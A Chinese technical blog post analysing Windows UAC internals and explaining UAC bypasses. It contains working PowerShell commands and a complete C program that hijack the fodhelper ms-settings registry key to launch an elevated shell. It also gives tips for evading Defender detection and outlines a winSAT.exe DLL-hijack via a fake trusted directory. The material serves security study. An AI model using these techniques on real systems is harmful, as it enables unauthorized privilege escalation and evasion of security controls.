
按照目前的逻辑，我们的程序**从受信任目录执行**，且配置了 `autoElevate` 为 `true`，就可以进入第一种流程。先编写一个简单的程序，比如弹个 CMD，使用 VS 编译程序的时候加入 `manifest`，指定 `requireAdministrator` 级别，表示需要获得权限提升，如下：

![图片描述](upload/attach/202206/701197_8Q5PT7CP3XCVK28.png)

使用命令 `mt -inputresource:test.exe;#1 -out:test.manifest` 从 `Taskmgr.exe` 中提取 `manifest` 文件，加入 `autoElevate` 后使用：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
<security>
<requestedPrivileges>
<requestedExecutionLevel level="requireAdministrator" uiAccess="false"></requestedExecutionLevel>
</requestedPrivileges>
</security>
</trustInfo>
<asmv3:application>
<asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
<dpiAware>true</dpiAware>
<autoElevate>true</autoElevate>
</asmv3:windowsSettings>
</asmv3:application>
</assembly>
```

加入 `manifest`：`mt.exe -manifest test.manifest -outputresource:test.exe;1`，好的，果然失败了：

![图片描述](upload/attach/202206/701197_M2DM4NA6CSP52FG.png)

// 这里还有一个关键函数，可以定位到这里有问题，如果验证正常的话，Reply应该是返回 0 的，失败就会返回错误代码
`Reply = AiCheckLUA(v155, (int *)&a4a, v148, v150, v80, (__int64)v79, (__int64)v192, v78, a11, (__int64 *)&v163);`
//经过测试，`AiLaunchConsentUI` 和 `AiCheckLUA` 函数都返回了错误值 `0x202b`
`appinfo!AiLaunchConsentUI+0x518`:
`00007ffc`9c3d78b8 e8e3d0ffff call appinfo!AiLaunchProcess (00007ffc`9c3d49a0)
0:021> gu
`appinfo!AiCheckLUA+0x343`:
`00007ffc`9c3d7203 488b7c2468 mov rdi,qword ptr [rsp+68h] ss:000000e3`8a27e698=0000000000000000
0:021> gu
`appinfo!RAiLaunchAdminProcess+0xbe2`:
`00007ffc`9c3d68a2 894584 mov dword ptr [rbp-7Ch],eax ss:000000e3`8a27e8b4=00000000
0:021> r rax
`rax=000000000000202b`
// 实际上在下面这段代码出现了错误，`AiLaunchProcess` 会调用 `CreateProcessAsUserW` 函数创建 `consent` 进程，但最终出现了错误
// `AiLaunchConsentUI` 函数
```
if ( !v9 )
{
ExitCode = AiLaunchProcess( 0i64, token, 0i64, 0x1000080u, 0i64, Dst, 0x400u, 0i64,
pszDesktop, 0i64, a5, 0i64, 0, 0i64, 0i64, 0i64,
(struct _PROCESS_INFORMATION *)hThread);// 0:035> dt _PROCESS_INFORMATION e3`8bcfe370
// Windows_Web!_PROCESS_INFORMATION
// +0x000 hProcess : 0x00000000`00001a3c Void
// +0x008 hThread : 0x00000000`00001420 Void
// +0x010 dwProcessId : 0x160c //pid 5644
// +0x014 dwThreadId : 0x12d0
v9 = ExitCode;
if ( !ExitCode )
{
ExitCode = AipVerifyConsent(hThread[0]); // 验证 consent 进程
v9 = ExitCode;
if ( !ExitCode )
{
ResumeThread(hThread[1]); // 恢复执行 consent
ExitCode = WaitForSingleObject(hThread[0], dwMilliseconds);// 等待
v9 = ExitCode;
if ( !ExitCode )
{
if ( !GetExitCodeProcess(hThread[0], &ExitCode) )// 这里取出错误代码
```

虽然程序在 `AiIsEXESafeToAutoApprove` 函数校验中通过了，但在后续传递给 `consent.exe` 程序进行处理的过程中出现了问题，还是需要再分析一下~ 下次一定

**——————————————— 分界线 ———————————————**

下面开始介绍成熟的 Bypass 技巧

### 一、通过注册表劫持 Bypass UAC

参考：<a href="elink@c0dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2@1K9r3g2E0j5i4W2G2M7W2)9J5k6i4c8W2j5$3S2Q4x3V1k6#2N6r3W2D9K9i4A6A6L8X3N6Q4x3X3c8S2i4K6u0V1j5$3!0E0L8h3!0F1i4K6u0V1N6$3W2F1k6r3!0%4M7#2)9J5k6r3u0A6L8X3q4J5P5g2)9J5k6s2c8G2i4K6u0V1k6i4y4U0j5h3I4S2N6r3g2Q4x3X3c8@1L8#2)9J5k6s2y4&6M7%4c8W2L8g2)9J5k6s2m8J5K9i4k6A6L8r3g2Y4k6i4y4Q4x3X3c8U0x3e0j5@1z5o6u0U0j5$3g2V1y4r3t1`."><mark class="encrypted">670K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2@1K9r3g2E0j5i4W2G2M7W2)9J5k6i4c8W2j5$3S2Q4x3V1k6#2N6r3W2D9K9i4A6A6L8X3N6Q4x3X3c8S2i4K6u0V1j5$3!0E0L8h3!0F1i4K6u0V1N6$3W2F1k6r3!0%4M7#2)9J5k6r3u0A6L8X3q4J5P5g2)9J5k6s2c8G2i4K6u0V1k6i4y4U0j5h3I4S2N6r3g2Q4x3X3c8@1L8#2)9J5k6s2y4&6M7%4c8W2L8g2)9J5k6s2m8J5K9i4k6A6L8r3g2Y4k6i4y4Q4x3X3c8U0x3e0j5@1z5o6u0U0j5$3g2V1y4r3t1`.</mark></a>

目标程序：`Fodhelper`

注册表键值：`HKCU\Software\Classes\ms-settings\shell\open\command`

利用思路：添加注册表键值 `HKCU\Software\Classes\ms-settings\shell\open\command`，设置其 value 为需要执行的程序路径或命令；添加 `HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute`（修改 `HKCU` 下的键值只需要普通用户权限）。这样程序启动后会执行 `HKCU\Software\Classes\ms-settings\shell\open\command` 中的内容，从而绕过 UAC 弹窗

**简单分析：**

可以发现，`fodhelper.exe` 在 `manifest` 中配置了 `autoElevate` 为 True，并且运行之后没有弹窗。

```
strings.exe -s *.exe | findstr /i "autoElevate"
......
C:\Windows\System32\fodhelper.exe: <autoElevate>true</autoElevate>
```

使用 `ProcessMonitor` 监控，发现程序确实去访问 `HKCU\Software\Classes\ms-settings\shell\open\command`，不过默认情况下这个键值是不存在的，仔细看前面记录会发现 `HKCU\Software\Classes\ms-settings` 也是不存在的。

![图片描述](upload/attach/202206/701197_UA6AX8EVZD9TVRC.png)

先创建 `HKCU\Software\Classes\ms-settings\shell\open\command` 项：

```
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
```

然后再次监控 `fodhelper` 运行，如果存在 `HKCU\Software\Classes\ms-settings\shell\open\command`，还会去查询 `HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute`

![图片描述](upload/attach/202206/701197_QE4ZPQ4EJQVZG64.png)

同样，再创建 `HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute` 试一下：

```
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
```

可以发现，程序在成功查询到 `HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute` 后会去查询 `HKCU\Software\Classes\ms-settings\shell\open\command\command` 或 `HKCU\Software\Classes\ms-settings\shell\open\command\(Default)`，事实证明它们是一样的

![图片描述](upload/attach/202206/701197_A4ADVN3V9ACE5X5.png)

这里我们来设置 `HKCU\Software\Classes\ms-settings\shell\open\command\command` 吧，将其设置为 `cmd.exe`。嗯。。。Defender 会检测到，但可以写入注册表，虽然过一会儿就被删了

```
[String]$program = "cmd /c start cmd.exe"
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
```

不过，利用这段时间启动 `fodhelper` 还是可以成功的 ~

![图片描述](upload/attach/202206/701197_V2NJ346WKCM4MAP.png)

如果设置的 `HKCU\Software\Classes\ms-settings\shell\open\command` 中不包含敏感字符，Defender 就不会检测到，不会弹出提示，也不会删除键值：

![图片描述](upload/attach/202206/701197_DRN9SFCX5EDHRVN.png)

如果有时间，还可以看一下其他程序有没有类似问题 ~

**C 代码：**

```cpp
#include <windows.h>
#include <stdio.h>
int main(int argc, char* argv[]) {
PROCESS_INFORMATION pi = { 0 };
STARTUPINFOA si = { 0 };
HKEY hKey;
si.cb = sizeof(STARTUPINFO);
RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);
RegSetValueExA(hKey, "", 0, REG_SZ, (LPBYTE)"cmd /c start cmd.exe", strlen("cmd /c start cmd.exe"));
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
Sleep(5000);
RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
return 0;
}
```

### 二、通过 DLL 劫持 Bypass UAC

参考：<a href="elink@353K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2U0L8$3#2Q4x3V1k6@1k6h3&6S2j5X3I4W2i4K6u0V1N6r3g2U0K9r3u0D9L8$3N6Q4x3V1k6#2j5h3y4Q4x3X3c8T1P5i4m8S2M7%4y4Q4x3X3c8T1P5g2)9J5k6r3#2G2j5$3E0A6L8X3N6Q4x3X3c8@1M7Y4g2K6N6r3g2V1i4K6u0V1k6r3W2J5k6h3y4@1L8%4u0A6k6i4y4Q4x3X3b7J5y4r3p5&6y4U0j5%4y4h3j5$3k6b7`.`."><mark class="encrypted">5edK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2U0L8$3#2Q4x3V1k6@1k6h3&6S2j5X3I4W2i4K6u0V1N6r3g2U0K9r3u0D9L8$3N6Q4x3V1k6#2j5h3y4Q4x3X3c8T1P5i4m8S2M7%4y4Q4x3X3c8T1P5g2)9J5k6r3#2G2j5$3E0A6L8X3N6Q4x3X3c8@1M7Y4g2K6N6r3g2V1i4K6u0V1k6r3W2J5k6h3y4@1L8%4u0A6k6i4y4Q4x3X3b7J5y4r3p5&6y4U0j5%4y4h3j5$3k6b7`.`.</mark></a>

目标程序：`winSAT.exe`

`DLL`：`winmm.dll`

利用思路：使用 `CreateDirectory API` 创建 `"C:\\Windows \\System32"` 目录（`"Windows"` 后面有空格）绕过 `Appinfo.dll (AIS)` 中 `RtlPrefixUnicodeString` 函数中的可信目录的检查。将目标程序复制到此目录，伪造 `DLL`，利用 `DLL` 加载顺序使目标程序加载伪造的 `DLL` 执行任意代码，从而绕过 UAC 弹窗提示

**简单分析：**

先看一下 `DLL` 加载顺序：

1. 程序所在目录

2. 系统目录即 `SYSTEM32` 目录

3. 16位系统目录即 `SYSTEM` 目录

4. `Windows`目录

5. 程序加载目录（可通过 `SetCurrentDirectory` 函数设置）

6. `PATH` 环境变量中列出的目录

下面是个简单的例子，`TestLoad` 加载 `onlytest.dll`，程序加载目录是 `C:\\Users\\strawberry`，可以发现程序在加载 `DLL` 的时候会从程序所在目录开始寻找，然后才会从系统目录中搜索：

![图片描述](upload/attach/202206/701197_P2Z5KERWQZ9XJP2.png)

`AIS` 要求程序从可信目录中启动，而这些目录普通用户是没办法写入的。但是可以新建 `"C:\\Windows \\System32"` 目录，将白名单程序复制到这个目录，这样劫持 `DLL` 就顺理成章了。
